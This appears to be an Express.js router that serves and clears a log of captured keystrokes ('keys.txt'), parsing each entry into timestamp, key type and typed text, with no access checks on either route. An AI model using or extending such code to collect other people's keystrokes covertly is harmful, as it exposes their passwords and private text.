router.get('/', async (req, res) => {
    try {
        const logPath = path.join(__dirname, '../../logs/keys.txt');

        if (!fs.existsSync(logPath)) {
            return res.status(404).json({ message: 'Log file not found' });
        }

        const data = fs.readFileSync(logPath, 'utf8');
        const logs = data.split('\n')
            .filter(line => line.trim() !== '')
            .map(line => {
                try {
                    // Parse each log line into a structured object
                    const parts = line.split('|').map(part => part.trim());
                    const [timestampPart, dataPart, ...rest] = parts;
                    
                    const timestamp = timestampPart.match(/\[(.*?)\]/)[1];
                    const type = timestampPart.match(/\[(CHAR|SPACE|ENTER|BACKSPACE|TAB)\]/i)?.[1] || 'CHAR';
                    const data = dataPart.replace(/^\[(.*?)\]/, '').trim();
                    
                    const otherInfo = rest.reduce((acc, part) => {
                        const [key, value] = part.split(':').map(p => p.trim());
                        acc[key.toLowerCase()] = value;
                        return acc;
                    }, {});

                    return {
                        timestamp,
                        type,
                        data,
                        ...otherInfo
                    };
                } catch (e) {
                    return { raw: line };
                }
            });

        res.status(200).json({ logs });
    } catch (error) {
        console.error('Error reading logs:', error.message);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// New endpoint to clear logs
router.delete('/', (req, res) => {
    try {
        const logPath = path.join(__dirname, '../../logs/keys.txt');
        if (fs.existsSync(logPath)) {
            fs.writeFileSync(logPath, '');
            return res.status(200).json({ message: 'Logs cleared successfully' });
        }
        res.status(404).json({ message: 'Log file not found' });
    } catch (error) {
        console.error('Error clearing logs:', error);
        res.status(500).json({ message: 'Failed to clear logs' });
    }
});

module.exports = router;
